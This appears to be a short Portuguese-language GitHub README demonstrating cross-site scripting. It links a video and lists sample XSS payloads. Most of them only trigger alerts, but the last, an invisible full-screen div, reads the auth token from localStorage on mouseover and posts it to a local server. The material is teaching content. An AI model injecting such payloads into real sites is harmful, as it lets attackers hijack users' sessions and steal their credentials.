# XSS-Exemplo
Exemplo de funmcionamento do ataque XSS

# Video explicando os conceitos

[![Watch the video](https://img.youtube.com/vi/HQUCYEr50wc/maxresdefault.jpg)](https://www.youtube.com/watch?v=HQUCYEr50wc)

# Iframe
`<iframe src="https://www.cristianoprogramador.com/">`

# Img
`<img src="1https://www.cristianoprogramador.com/img/profile.jpg">`

# Button
`<button onclick="Alert Hackeado">Click me</button>`

# On mouse over
`<div onmouseover="alert('injetado!')" style="width:100vw; height: 100vh; color:transparent"> </div>`

# Script
`<script>alert('123')</script>`
 
# Request HTTP
`<div onmouseover="axios.post('http://localhost:3001/', {}, {headers:{Authorization:localStorage['token']} }).then((result)=>{})" style="width:100vw; height: 100vh; color:transparent"></div>`
